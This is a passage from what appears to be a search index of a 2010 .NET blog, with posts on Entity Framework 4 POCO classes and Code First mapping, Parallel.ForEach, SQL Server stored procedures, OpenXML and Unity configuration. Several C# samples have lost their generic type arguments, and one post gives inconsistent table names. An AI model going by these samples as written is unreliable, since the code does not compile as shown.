Objects\u201d. POCO classes are basically classes which we generally write with all the public properties (e.g. Customer, Order). Now, EF4, by default generates all the entities for us (we will see this in this article) and we dont have to write those classes. Just becuase EF does this, in order to distinguish \u201cOUR\u201d classes or the \u201cClasses written by us\u201d from the generated classes, we call those \u201cOUR\u201d classes as POCO classes. There are basically 2 ways you can make use of POCO support in EF4:- A) **Via ObjectContext B) Via T4 Templates (this will be covered here)** A) Via ObjectContext :- This is done the following way:- i) Generate the model using the wizard. ii) Turn off the code-generation (because you want to write code yourself). iii) Create your POCO classes, Address and Contact in this case and dont have them inherited from EntityObject. iv) Create your own ObjectContext class. v) Use your ObjectContext class to use POCO classes. i) Generate the model using the wizard:- Create a console application and follow the below steps:- Step 1 :- Step 2 :- Step 3 :- When you click the \u201cFinish\u201d button above, you should see an EDMX file and a code-behind file added to your solution. Double-clicking the edmx file shows the following:- Code-behind file contains the following :- As you see the classes \u201cContact\u201d and \u201cAddress\u201d inherit from EntityObject. there would be times when you dont want your entities to be separated in their own class library and dont want them to get inherited from the EntityObject class. So you (very conventionally) create your own classes named Address and Contacts with the stardard public properties. When objects of those \u201cYOUR\u201d classes are called Plain Old CLR Objects or POCO. ii) Turn off the code-generation (because you want to write code yourself):- Select the EDMX file in the solution explorer and go to its property window (press F4). Delete the value for the \u201cCustom Tool\u201d in the properties window. when you have deleted the custom tool value, notice that the code-behind for the EDMX file is gone and you are on your own to create entities which we will see in the next step. **iii) Create your POCO classes, Address and Contact in this case and dont have them inherited from EntityObject. **Create a class library and create the following classes :- The Contact class public class Contact { public int ContactID { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string Title { get; set; } public DateTime AddDate { get; set; } public DateTime ModifiedDate { get; set; } public ICollection Addresses { get; set; } } The Address class public class Address { public int addressID { get; set; } public string Street1 { get; set; } public string Street2 { get; set; } public string City { get; set; } public string StateProvince { get; set; } public string CountryRegion { get; set; } public string PostalCode { get; set; } public string AddressType { get; set; } public DateTime ModifiedDate { get; set; } public int ContactID { get; set; } public Contact Contact { get; set; } } iv) Create your own ObjectContext class:- public class POCOObjectContext : ObjectContext { private ObjectSet contacts; private ObjectSet addresses; public POCOObjectContext() : base(\"name=AddressBook2Entities\", \"AddressBook2Entities\") { contacts = CreateObjectSet (); addresses = CreateObjectSet (); } public ObjectSet Addresses { get { return addresses; } } public ObjectSet Contacts { get { return contacts; } } } Notice the constructer getting used takes two parameters:- For the first parameter (\u201cname\u201d) we are passing is the name of the connection string in config file. This connection string got added when we generated the model from the database. For the second parameter, we are passing the name of the container. On the properties window of the edmx file, look for the value for \u201cEntity Container Name\u201d. **Using the application :- ** Use the classes in the main method of the console application. Below is just printing all the contacts from the \u201cContact\u201d table. class Program { static void Main(string[] args) { using (POCOObjectContext context = new POCOObjectContext()) { List contacts = context.Contacts.ToList(); foreach (var item in contacts) { Console.WriteLine(item.FirstName.Trim() +\" \"+ item.LastName.Trim()); } Console.ReadLine(); } } } The output:- Summary:- So, we saw that ObjectContext or your class (inheriting from the ObjectContext) is smart. Although our entity class is not inheriting from the EntityObject, ObjectContext can look at them and let us work with the them just like we could have with the generated code. The advantage here (with POCOs) is our entities are clean and do not have any dependency on Entity Framework which enables better organized code and gives us flexibility for unit testing etc.","title":"Entity Framework 4 : POCO support 1 (via ObjectContext)"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#a-via-objectcontext","text":"B) Via T4 Templates (this will be covered here)**","title":"A) **Via ObjectContext"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#a-via-objectcontext-","text":"This is done the following way:- i) Generate the model using the wizard. ii) Turn off the code-generation (because you want to write code yourself). iii) Create your POCO classes, Address and Contact in this case and dont have them inherited from EntityObject. iv) Create your own ObjectContext class. v) Use your ObjectContext class to use POCO classes.","title":"A) Via ObjectContext :-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#i-generate-the-model-using-the-wizard-","text":"","title":"i) Generate the model using the wizard:-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#create-a-console-application-and-follow-the-below-steps-","text":"Step 1 :- Step 2 :- Step 3 :- When you click the \u201cFinish\u201d button above, you should see an EDMX file and a code-behind file added to your solution. Double-clicking the edmx file shows the following:- Code-behind file contains the following :- As you see the classes \u201cContact\u201d and \u201cAddress\u201d inherit from EntityObject. there would be times when you dont want your entities to be separated in their own class library and dont want them to get inherited from the EntityObject class. So you (very conventionally) create your own classes named Address and Contacts with the stardard public properties. When objects of those \u201cYOUR\u201d classes are called Plain Old CLR Objects or POCO.","title":"Create a console application and follow the below steps:-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#ii-turn-off-the-code-generation-because-you-want-to-write-code-yourself-","text":"Select the EDMX file in the solution explorer and go to its property window (press F4). Delete the value for the \u201cCustom Tool\u201d in the properties window. when you have deleted the custom tool value, notice that the code-behind for the EDMX file is gone and you are on your own to create entities which we will see in the next step.","title":"ii) Turn off the code-generation (because you want to write code yourself):-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#iii-create-your-poco-classes-address-and-contact-in-this-case-and-dont-have-them-inherited-from-entityobject","text":"**Create a class library and create the following classes :- The Contact class public class Contact { public int ContactID { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string Title { get; set; } public DateTime AddDate { get; set; } public DateTime ModifiedDate { get; set; } public ICollection Addresses { get; set; } } The Address class public class Address { public int addressID { get; set; } public string Street1 { get; set; } public string Street2 { get; set; } public string City { get; set; } public string StateProvince { get; set; } public string CountryRegion { get; set; } public string PostalCode { get; set; } public string AddressType { get; set; } public DateTime ModifiedDate { get; set; } public int ContactID { get; set; } public Contact Contact { get; set; } }","title":"**iii) Create your POCO classes, Address and Contact in this case and dont have them inherited from EntityObject."},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#iv-create-your-own-objectcontext-class-","text":"public class POCOObjectContext : ObjectContext { private ObjectSet contacts; private ObjectSet addresses; public POCOObjectContext() : base(\"name=AddressBook2Entities\", \"AddressBook2Entities\") { contacts = CreateObjectSet (); addresses = CreateObjectSet (); } public ObjectSet Addresses { get { return addresses; } } public ObjectSet Contacts { get { return contacts; } } } Notice the constructer getting used takes two parameters:- For the first parameter (\u201cname\u201d) we are passing is the name of the connection string in config file. This connection string got added when we generated the model from the database. For the second parameter, we are passing the name of the container. On the properties window of the edmx file, look for the value for \u201cEntity Container Name\u201d.","title":"iv) Create your own ObjectContext class:-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#using-the-application-","text":"**","title":"**Using the application :-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#use-the-classes-in-the-main-method-of-the-console-application-below-is-just-printing-all-the-contacts-from-the-contact-table","text":"class Program { static void Main(string[] args) { using (POCOObjectContext context = new POCOObjectContext()) { List contacts = context.Contacts.ToList(); foreach (var item in contacts) { Console.WriteLine(item.FirstName.Trim() +\" \"+ item.LastName.Trim()); } Console.ReadLine(); } } } The output:-","title":"Use the classes in the main method of the console application. Below is just printing all the contacts from the \u201cContact\u201d table."},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/#summary-","text":"So, we saw that ObjectContext or your class (inheriting from the ObjectContext) is smart. Although our entity class is not inheriting from the EntityObject, ObjectContext can look at them and let us work with the them just like we could have with the generated code. The advantage here (with POCOs) is our entities are clean and do not have any dependency on Entity Framework which enables better organized code and gives us flexibility for unit testing etc.","title":"Summary:-"},{"location":"2010/08/2010-08-25-how-awesome-is-system-threading-tasks-parallel-class/","text":"The short answer is \u201cprofoundly awesome\u201d. This class is introduced in .NET 4.0 and allows you to execute tasks parallelly using threads without you even thinking about thead-way at all. Recently I worked on a tool which fetches data from database and persists that data as files in the file system. Following is the simplified version of the data in the database tables (Folder and Content) Folder table :- And the requirement is to persist the content of \u201cMyContent\u201d as MyContent.Html under Folder2/Folder1. This is a simplified example and ofcourse, there were much deeper levels of folders. Now one way to go about this is :- a) First create all the folders. b) Get all contents one by one from the database and persist each of them in the Html file under the corresponding folder. for the point b) the usual way we would write is something like below :- DataSet ContentIdsAndPathsDS = GetAllContentIdsAndPaths(); if (ContentIdsAndPathsDS != null && ContentIdsAndPathsDS.Tables.Count > 0) { DataRowCollection rows = ContentIdsAndPathsDS.Tables[0].Rows; Stopwatch watch = Stopwatch.StartNew(); watch.Start(); foreach (DataRow row in ContentIdsAndPathsDS.Tables[0].Rows) { if (row[\"ContentId\"] != DBNull.Value && row[\"Path\"] != DBNull.Value) { string contentId = row[\"ContentId\"].ToString(); string fileFullPath = rootFolderPath + row[\"Path\"].ToString() + extensionOfFilesCreated; OutputSingleContent(contentId, fileFullPath); } } watch.Stop(); string message = rows.Count.ToString() + \" contents have been written to the disk and It took \" + (watch.ElapsedMilliseconds / 1000).ToString() + \" seconds\"; } Here is how you would achieve things much faster ( we will see \u201chow much\u201d fast ) using Parallel.ForEach() method. DataSet ContentIdsAndPathsDS = GetAllContentIdsAndPaths(); if (ContentIdsAndPathsDS != null && ContentIdsAndPathsDS.Tables.Count > 0) { DataRowCollection rows = ContentIdsAndPathsDS.Tables[0].Rows; Stopwatch watch = Stopwatch.StartNew(); watch.Start(); Parallel.ForEach ( documentsAndElementsDS.Tables[0].AsEnumerable(), row => { if (row[\"ContentId\"] != DBNull.Value && row[\"Path\"] != DBNull.Value) { string contentId = row[\"ContentId\"].ToString(); string fileFullPath = rootFolderPath + row[\"Path\"].ToString() + extensionOfFilesCreated; OutputSingleContent(contentId, fileFullPath); } } );watch.Stop(); string message = rows.Count.ToString() + \" contents have been written to the disk and It took \" + (watch.ElapsedMilliseconds / 1000).ToString() + \" seconds\"; } I highlighted the code in both cases just to indicate that the Parallel.ForEach() executes the same code as our regular ForEach. By the way, following is the method definition which both foreach and Parallel.ForEach() call :- static void OutputSingleContent(string contentId, string fileFullPath) { try { WriteContentToFile(fileFullPath, GetFormattedContent(contentId)); //WriteContentToFile(logFileFullPath, \"File created :- \" + fileFullPath, true); Console.WriteLine(\"File created :- \" + fileFullPath); } catch (Exception) { throw; } } The result:- Following is the result on my Intel(R) Core 2 Duo 2.20 GHz machine:- As you see the Parallel.ForEach is almost 4 times faster than the regular one. The numbers might be diffrent in your machine. However, Parallel.ForEach would still be way faster. Why it is faster:- When the program is run, there is only one thread and when you use regular foreach, only that main thread performs the specified operation in each iteration. However, when you use Parallel.ForEach(), a worker thread is used from the threadpool for each iteration and those worker threads would \u201cindependently\u201d do the things they have been asked to do. Debugging parallel programs in VS.NET 2010 is fun. So just for fun, put a berakpoint on the line you have Parallel.ForEach and the start of OutputSingleContent() and debug. It would first hit Parallel.ForEach(). The above parallel stack window indicates that there is only one thread running as of now(the 3 threads are for running internals methods of .NET). If you right click on the main thread box and click on the \u201cShow External Code\u201d, It would show you all those method calls and this is all regular stuff which happens even if you don\u2019t use threads explicitely or Parallel class. But If you step into OutputSingleContent() twise or more, you should see more worker threads under the Parallel stacks window. Parallel stacks window indicates that there are 2 threads executing OutputSingleContent() method independently. When do you use this :- Have a look at the this document which recommends that one should execute \u201cindependent\u201d tasks with Parallel.ForEach(). In the above example, getting data and saving to a file for each content is an independent operation for each content. Parallel.ForEach() is just one thing. We can look at msdn to explore more about parallel computing. Hope this help you in getting started with parallel programming in .NET.","title":"How awesome is System.Threading.Tasks.Parallel class?"},{"location":"2010/09/2010-09-04-entity-framework-using-select-stored-procedures-for-entities-having-same-column-names/","text":"I have this following model. Check the \u201cModifiedDate\u201d which is common in both the entities. And both tables in the database have ModifiedDate columns. Following is the stored procedure which gets all the contacts along with their addresses:- CREATE PROCEDURE SelectAllContactsWithAddresses AS BEGIN SELECT Contact.ContactId, Contact.FirstName, Contact.LastName, Contact.ModifiedDate, Address.AddressId, Address.ContactId AS AddressContactId, Address.CountryRegion, Address.StateProvince, Address.ModifiedDate FROM Contact INNER JOIN Address ON Contact.ContactId = Address.ContactId END Right click on the model and add the new stored procedure to the model :- Right click on the model and add the stored ptocedure as a \u201cFunction Import\u201d. In the \u201cAdd Function Import\u201d dialog, enter the function name and select the stored procedure name :- In the dialog, If you click \u201cGet Column Information\u201d, It looks into the stored procedure you selected and shows the selected columns in the immediately below grid. Notice the \u201cModifiedDate1\u201d column. Although, we didn\u2019t return any column by that name in the stored procedure, the stored procedure returns an ambigous column name \u201cModifiedDate\u201d which exists both in Contact and Address tables. Make sure you click on \u201cCreate New Complex Type\u201d to create a new complex type. The result set will be a complex type because It does not match up wo any of the entities in the model, rather it is made of columns from both Contact and Address tables. Now the context has a method named SelectAllContactsWithAddresses() and when you execute a code like this, foreach (var item in context.SelectAllContactsWithAddresses() ) { Console.WriteLine(item.FirstName.Trim() + \" \" + item.LastName.Trim()); Console.WriteLine(item.AddressContactId + \" \" + item.CountryRegion); } you get the following error :- System.Data.EntityCommandExecutionException: The data reader is incompatible with the specified 'AddressBookModel.SelectAllContactsWithAddresses_Result2'. A member of the type, 'ModifiedDate1', does not have a corresponding column in the data reader with the same name. at System.Data.Query.InternalTrees.ColumnMapFactory.GetMemberOrdinalFromReader(DbDataReader storeDataReader, EdmMember member, EdmType currentType, Dictionary`2 renameList) at System.Data.Query.InternalTrees.ColumnMapFactory.GetColumnMapsForType(DbDataReader storeDataReader, EdmType edmType, Dictionary`2 renameList) at System.Data.Query.InternalTrees.ColumnMapFactory.CreateColumnMapFromReaderAndType(DbDataReader storeDataReader, EdmType edmType, EntitySet entitySet, Dictionary`2 renameList) at System.Data.Query.InternalTrees.ColumnMapFactory.CreateFunctionImportStruc turalTypeColumnMap(DbDataReader storeDataReader, FunctionImportMapping mapping,EntitySet entitySet, StructuralType baseStructuralType) at System.Data.EntityClient.EntityCommandDefinition.FunctionColumnMapGenerator.System.Data.EntityClient.EntityCommandDefinition.IColumnMapGenerator.CreateCol umnMap(DbDataReader reader) at System.Data.Objects.ObjectContext.CreateFunctionObjectResult[TElement](EntityCommand entityCommand, EntitySet entitySet, EdmType edmType, MergeOption mergeOption) at System.Data.Objects.ObjectContext.ExecuteFunction[TElement](String functio nName, MergeOption mergeOption, ObjectParameter[] parameters) at System.Data.Objects.ObjectContext.ExecuteFunction[TElement](String functio nName, ObjectParameter[] parameters) at AddressBook.AddressBookEntities.SelectAllContactsWithAddresses() in E:\\Ashish\\Research\\VS Solutions\\EntityFramework\\PresentationDemo\\AddressBookConsole\\AddressBook\\AddressBookModel.Designer.cs:line 148 at AddressBookConsole.Program.ShowContacts() in E:\\Ashish\\Research\\VS Solutions\\EntityFramework\\PresentationDemo\\AddressBookConsole\\AddressBookConsole\\Progra m.cs:line 50 at AddressBookConsole.Program.Main(String[] args) in E:\\Ashish\\Research\\VS So lutions\\EntityFramework\\PresentationDemo\\AddressBookConsole\\AddressBookConsole\\Program.cs:line 15 To put simply, the columns from the stored procedure must match the properties in the entities in the model . So we modify our stored procedure in the following way:- ALTER PROCEDURE SelectAllContactsWithAddresses AS BEGIN SELECT Contact.ContactId, Contact.FirstName, Contact.LastName, Contact.ModifiedDate AS ContactModifiedDate , Address.AddressId, Address.ContactId AS AddressContactId, Address.CountryRegion, Address.StateProvince, Address.ModifiedDate AS AddressModifiedDate FROM Contact INNER JOIN Address ON Contact.ContactId = Address.ContactId END Now we need to \u201cRefresh\u201d the model with the changed stored procedure:- We make sure the function import shows correct columns now. by clicking on the \u201cGet column information\u201d button inthe properties page. We nee to change the properties in the model as well to make it same as the changed columns returned:- Now, we write code like this :- foreach (var contactWithAddresses in context.SelectAllContactsWithAddresses()) { Console.WriteLine(contactWithAddresses .FirstName.Trim() + \" \" + contactWithAddresses .LastName.Trim()); Console.WriteLine(contactWithAddresses .ContactModifiedDate + \" \" + contactWithAddresses .AddressModifiedDate); } and we get the correct results without any problem:-","title":"Entity Framework - Using Select stored procedures for entities having same column names"},{"location":"2010/09/2010-09-07-entity-framework-ctp4-%E2%80%93-code-first-%E2%80%93-map-your-poco-entities-to-different-table/","text":"The problem :- Following is the code I use and I get an error given below:- Contact:- public class Contact { public int ContactID { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string Title { get; set; } public DateTime AddDate { get; set; } public DateTime ModifiedDate { get; set; } } Context:- public class AddressBook : DbContext { public DbSet<Contact> Contact { get; set; } } The main program:- using (var context = new AddressBook()) { var contact = new Contact { ContactID = 10000, FirstName = \"Brian\", LastName = \"Lara\", ModifiedDate = DateTime.Now, AddDate = DateTime.Now, Title = \"Mr.\" }; context.Contact.Add(contact); int result = context.SaveChanges(); Console.WriteLine(\"Result :- \" + result.ToString()); } And I get the following error on \"context.Contact.Add(contact);\":- System.InvalidOperationException: The model backing the 'AddressBook' context has changed since the database was created. Either manually delete/update the database, or call Database.SetInitializer with an IDatabaseInitializer instance. For example, the RecreateDatabaseIfModelChanges strategy will automatically delete and recreate the database, and optionally seed it with new data. at System.Data.Entity.Infrastructure.CreateDatabaseOnlyIfNotExists 1.InitializeDatabase(TContext context) at System.Data.Entity.Infrastructure.Database.Initialize() at System.Data.Entity.Internal.InternalContext.Initialize() at System.Data.Entity.Internal.InternalContext.GetEntitySetAndBaseTypeForType(Type entityType) at System.Data.Entity.Internal.Linq.EfInternalQuery 1.Initialize() at System.Data.Entity.DbSet 1.ActOnSet(Action action,EntityState newState, TEntity entity) at System.Data.Entity.DbSet 1.Add(TEntity entity) at CodeFirst.Client.Program.Main(String[] args) in E:\\Ashish\\Research\\VS Solutions\\EntityFramework\\CodeFirstApproach_EF_CTP4\\CodeFirst.Client\\Program.cs:line 35 Solution :- The error message says:- \u201cSystem.InvalidOperationException: The model backing the 'AddressBook' context has changed since the database was created. Either manually delete/update the database, or call Database.SetInitializer with an IDatabaseInitializer instance. For example, the RecreateDatabaseIfModelChanges strategy will automatically delete and recreate the database, and optionally seed it with new data\u201d so, first look at the Database.SetInitializer() method which you can call in three different ways:- // 1) This is the default strategy. It creates the DB only if it doesn't exist Database.SetInitializer(new CreateDatabaseOnlyIfNotExists ()); // 2) Recreates the DB if the model changes but doesn't insert seed data. Database.SetInitializer(new RecreateDatabaseIfModelChanges ()); // 3) Strategy for always recreating the DB every time the app is run. Database.SetInitializer(new AlwaysRecreateDatabase ()); None of the above cases is applicable to us If we have an already existing database with data. However, we still need to call Database.SetInitializer(null) to nullify the default strategy , the first one in the above list \u2013 \u201ccreates the DB only if it doesn't exist\u201d. There is a link pointed by Pault which has the following comment by Jeff of EF team:- Friday, August 06, 2010 11:28 AM by Jeff @Mark For those who are seeing this exception: \"The model backing the 'Production' context has changed since the database was created. Either manually delete/update the database, or call Database.SetInitializer with an IDatabaseInitializer instance.\" Here is what is going on and what to do about it: When a model is first created, we run a DatabaseInitializer to do things like create the database if it's not there or add seed data. The default DatabaseInitializer tries to compare the database schema needed to use the model with a hash of the schema stored in an EdmMetadata table that is created with a database (when Code First is the one creating the database). Existing databases won\u2019t have the EdmMetadata table and so won\u2019t have the hash\u2026and the implementation today will throw if that table is missing. We'll work on changing this behavior before we ship the fial version since it is the default. Until then, existing databases do not generally need any database initializer so it can be turned off for your context type by calling: Database.SetInitializer (null); Jeff So, I took a leaf out of the above and added that in my main program:- Database.SetInitializer (null); using (var context = new AddressBook()) { var contact = new Contact { ContactID = 10000, FirstName = \"Brian\", LastName = \"Lara\", ModifiedDate = DateTime.Now, AddDate = DateTime.Now, Title = \"Mr.\" }; context.Contacts.Add(contact); int result = context.SaveChanges(); Console.WriteLine(\"Result :- \" + result.ToString()); } After making the above code change, I ran the program and hit a wall again (small part of the error message shown below):- System.Data.EntityCommandExecutionException: An error occurred while executing the command definition. See the inner exception for details. ---> System.Data.SqlClient.SqlException: Invalid object name 'dbo.Contacts' . at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection) Code-first, by convention, assumes that your table in the database is plularized form of your POCO class. For example, If your POCO class is Contact, code-first assumes that the table name is \u201cContacts\u201d and tries to find the table named \u201cContacts\u201d to persist the Contact objects to \u201cContacts\u201d table. Thats why we see an error above as we dont have a table named \u201cContacts\u201d in the database. We have table name as \u201cContact\u201d instead. So, while working with existing database, What If you want your POCO class point to a differnt table? For example, your POCO class is Contact however your table in the database is also Contact. The table name could be anything. To fix this, you need to map your Contact entity to the correct table name when the model is being created. In the context class, override the OnModelCreating() event handler in the Context class and map the object to the correct table name. public class AddressBook : DbContext { public DbSet Contacts { get; set; } protected override void OnModelCreating(ModelBuilder modelBuilder) { modelBuilder.Entity ().MapSingleType().ToTable(\"tblContact\"); } } If we run the sample now, It would run without any error. I also discussed this question here .","title":"Entity Framework CTP4 \u2013 Code First \u2013 Map your POCO entities to different table"},{"location":"2010/09/2010-09-07-entity-framework-%E2%80%93-ctp4-code-first-does-not-support-stored-procedures-yet/","text":"Code-first does not support stored procedures YET. See here .","title":"Entity Framework \u2013 CTP4 - Code-first does not support stored procedures YET."},{"location":"2010/09/2010-09-10-sql-server-coding-guidelines-and-best-practices/","text":"Object Type Convention Example Tables <ObjectName> Employee Department Association tables <Obeject1><Object2> EmployeeDepartment Stored Procedures <TableName>_<OperationOnTable> Employee_Select Views vw<TableName> Scalar User-defined functions <TableName>_<OperationOnTable> Employee_GetTotalHrsWorked Table valued user defined functions Triggers TR_<TableName>_<action><description> TR_<Employee>_<UpdateEmailAddress> Indexes IX_<TableName>_<ColumnNamesSeparatedBy_> IX_Employee_ID Primary Key Constraints PK_<TableName> PK_Employee Foreign Key Constraint FK_<TableName1>_<TableName2> FK_Employee_Department \u00b7 Datatype for a primary key :- uniqueidentifier \u00b7 Association tables should have a primary keyEmployeeDepartment should have ID, EmployeeId, DepartmentId. \u00b7 Avoid dynamic query. Use Stored procedures only. \u00b7 Use SET NOCOUNT ON in the beginning of Stored procedures and Triggers. \u00b7 Avoid Cursors wherever possible. Use SET based operations over row-by-row operations. Some of the scenarios are listed below:- a) If rows in a table needs to be updated on a condition, rather than using a cursor or loop, used UPDATE with Case statements. UPDATE Table table SET Column1 Case WHEN Column2=\u20191\u2019 THEN Column1=\u2019New value1\u2019 WHEN Column3 = \u20182\u2019 THEN Column1=\u2019New value2\u2019 END WHERE Column2=\u20191\u2019 OR Column3=\u20192\u2019 [ Example ] b) If records in the table need to be updated or deleted, use UPDATE or DELETE with JOINs rather than cursors and loops. UPDATE dbo.Table2 SET dbo.Table2.ColB = dbo.Table2.ColB + dbo.Table1.ColB FROM dbo.Table2 INNER JOIN dbo.Table1 ON (dbo.Table2.ColA = dbo.Table1.ColA); DELETE ab, b FROM Authors AS a INNER JOIN AuthorArticle AS ab ON a.AuthID=ab.AuthID INNER JOIN Articles AS b ON ab.ArticleID=b.ArticleID WHERE AuthorLastName='Tom'; \u00b7 Instead of using LOOP to insert data from Table B to Table A, try to use SELECT statement with INSERT statement. INSERT INTO TABLE A (column1, column2) SELECT column1, column2 FROM TABLE B WHERE \u00b7 Create a copy of the table with out any data following way:- SELECT TOP (0) * INTO EmployeeTest FROM Employee \u00b7 COUNT(*) and COUNT(1) are same performance-wise. Use either of them. \u00b7 Temparary Tables, Table variables and Common Table Expressions (CTE) o Temporary tables should be used when the data you hold in them is pretty large. Creating indexes in them would make the data retrieval faster. o Table variables are faster and good for smaller sets of data. o Table variables do not have statistics on them and indexes cannot be created on them so they are not good for holding large data. o Common Table Expressions are good for having smaller sets of data which need not be updated because it\u2019s similar to a derived table but has better readability and you can use the same CTE in the different places in the batch. o Use CTE for creating recursive queries.","title":"Sql Server - Coding Guidelines and best practices"},{"location":"2010/09/2010-09-10-table-variables-do-get-created-in-the-tempdb/","text":"DECLARE @MyTab1 TABLE ( Id uniqueidentifier, Name varchar(200) ) INSERT INTO @Mytab1 VALUES (newId(),'Ashish') SELECT * FROM @Mytab1 SELECT crdate AS CreatedDate,GetDate() As CurrentDate, Name from tempdb.dbo.sysobjects where name not like 'sys%' ORDER BY CrDate DESC Execute the above query in any database multiple times with some seconds interval and you will see the CreatedDate and the CurrentDate very close to each other in the resultset. \u201cCreatedDate\u201d is the time when that table variable was created in the tempDB database and \u201cCurrentDate\u201d is the datetime when you executed the query. \u201cCurrentDate\u201d will always be greater (just milliseconds) than the \u201cCreatedDate\u201d. Each time you execute the query, It creates a random name prefixed with a # and there is no naming conflict and no error. A good article here .","title":"Table variables do get created in the TempDB"},{"location":"2010/09/2010-09-19-debuggerdisplay-attribute/","text":"\"[DebuggerDisplay]\" [ http://chrisfulstow.com/customising-visual-studio-debugger-datatips-with-debuggerdisplay/ ]. Something you would save you few seconds (and more) while you are debugging.","title":"[DebuggerDisplay] Attribute"},{"location":"2010/09/2010-09-23-bulk-insert-using-openxml/","text":"-- Tables CREATE TABLE Singer ( Id int, Name varchar(200) ) CREATE TABLE SingerGenere ( SingerId int, GenereId int ) CREATE TABLE Genere ( ID int, Name varchar(200) ) Data -- Singers INSERT INTO Singer VALUES (1, 'Joe') INSERT INTO Singer VALUES (2, 'MJ') INSERT INTO Singer VALUES (3, 'ACDC') -- Genere INSERT INTOh Genere VALUES (1, 'Rock') INSERT INTO Genere VALUES (2, 'POP') INSERT INTO Genere VALUES (3, 'Heavy Metal') -- Singer - Genere mapping INSERT INTO SingerGenere (SingerId, GenereId) VALUES (1,1) INSERT INTO SingerGenere (SingerId, GenereId) VALUES (2,2) INSERT INTO SingerGenere (SingerId, GenereId) VALUES (3,3) The stored procedure :- CREATE PROCEDURE GetSingersGenere (@SingerData XML) AS BEGIN DECLARE @hDoc int exec sp_xml_preparedocument @hDoc OUTPUT,@SingerData IF OBject_id('SingerGenereTable') IS NOT NULL BEGIN DROP TABLE SingerGenereTable END CREATE TABLE SingerGenereTable ( SingerName varchar(200), GenereName varchar(200) ) INSERT INTO SingerGenereTable ( SingerName, GenereName ) SELECT XMLSinger.SingerName, Genere.Name FROM OpenXML (@hDoc,'/Singers/Singer') WITH (SingerName varchar(200)'text()') XMLSinger INNER JOIN Singer on XMLSinger.SingerName=Singer.Name INNER JOIN SingerGenere ON SingerGenere.SingerId = Singer.Id INNER JOIN Genere ON Genere.Id = SingerGenere.GenereId SELECT * FROM SingerGenereTable END Executing the Stored procedure EXEC GetSingersGenere1 ' Joe ACDC '","title":"Bulk insert using OpenXML"},{"location":"2010/10/2010-10-17-using-unity-application-block-2-0-the-given-assembly-name-or-codebase-was-invalid-exception-from-hresult-0x80131047/","text":"I was trying to use Unity Apllication Block this morning and following is the code I wrote:- Interfaces (In the assembly named \"Interfaces\". In project :- Interfaces) namespace Interfaces { public interface IDoSomeWork1 { string DoSomeWork1(); } } namespace Interfaces { public interface IDoSomeWork2 { string DoSomeWork2(); } } Dependencies (In the assembly named \"Entities\". In project :- Entities) namespace Entities { public class ClassB : IDoSomeWork1 { public string DoSomeWork1() { return this.ToString(); } } } namespace Entities { public class ClassC : IDoSomeWork2 { public string DoSomeWork2() { return this.ToString(); } } } Class (In project :- UsingUnity) public class ClassA { [Dependency] public IDoSomeWork1 DoSomeWork1 { get; set; } [Dependency] public IDoSomeWork2 DoSomeWork2 { get; set; } public void SomeMethodInClassA() { Console.WriteLine(DoSomeWork1.DoSomeWork1()); Console.WriteLine(DoSomeWork2.DoSomeWork2()); } } App.Config (In a console application project :- ConsoleUsingUnity) <?xml version=\"1.0\" encoding=\"utf-8\" ?> <configuration> <configSections> <section name=\"unity\" type=\"Microsoft.Practices.Unity.Configuration.UnityConfigurationSection, Microsoft.Practices.Unity.Configuration\" /> </configSections> <unity> <containers> <container> <types> <type type=\"Interfaces.IDoSomeWork1, Interfaces\" mapTo=\"Entities.ClassB, Entities\" /> <type type=\"Interfaces.IDoSomeWork2, Interfaces\" mapTo=\"Entities.ClassC, Entities\" /> </types> </container> </containers> </unity> </configuration> The client (In a console application project :- ConsoleUsingUnity) public class Class1 { static void Main(string[] args) { IUnityContainer container = new UnityContainer(); // Load from config file UnityConfigurationSection section = (UnityConfigurationSection)ConfigurationManager.GetSection(\"unity\"); section.Configure(container); ClassA classA = container.Resolve (); classA.SomeMethodInClassA(); } } And when I run the client, I get the following error at section.Configure(container);:- The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047) Solution I must state that the code above didn't give me any problem (build error etc.). It just gave me the error I stated in my question. The problem with Unity at this point of time is that It does not provide which assembly or a which types in the assembly could not be loaded. This is a requested feature . In my case It was a missing assembly problem. I didn't reference Entities assembly in to the client application project. It seems that that \"Entities\" assembly could be resolved only at the run-time (since it didn't give me any compile time error). However, the run-time error was also not useful at all. I had a look a Fusion Log viewer (It should be in the .NET SDK folder). What a gem of an utility It is. It can log all kind of assembly bindings (all or only failures) and It give a very neat description of which assembly could not load. Very helpful! I added the the reference of the \u201cEntities\u201d assembly to the client application and It was able to call methods from the dependencies (ClassB and ClassC). So, next time, you get this \"The given assembly name or codebase was invalid\" error, try Fusion Log Viewer. It wont help you in finding which types couldn't be loaded. However,at least you will be sure all your assemblies are getting loaded correctly.","title":"Using Unity Application Block 2.0 - The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047)"},{"location":"2010/11/2010-11-01-sql-server-2008-generate-the-data-script-insert-script-from-tables/","text":"How to generate the data script for SQL server 2008 database tables Right click on the database where your table exists > Tasks > Generate Scripts Click Next on the below screen Choose \u201cSelect specific database objects\u201d radio button, expand the tables and choose the table for which the data script needs to be generated and click Next. On the below screen, click \u201cAdvanced\u201d and then select \u201cData only\u201d option from the \u201cTypes of data to script\u201d. By default \u201cSchema only\u201d option is selected. You can also select \u201cSchema and data\u201d option for both creating table and also for the insert scripts. Choose where to save the insert script (File/Query window/Clipboard) and click on Next.You can see the progress and will see the generated insert script. IMPORTANT NOTES \u2013 A) If your table has large amount of data (like mine in this case having 5000K 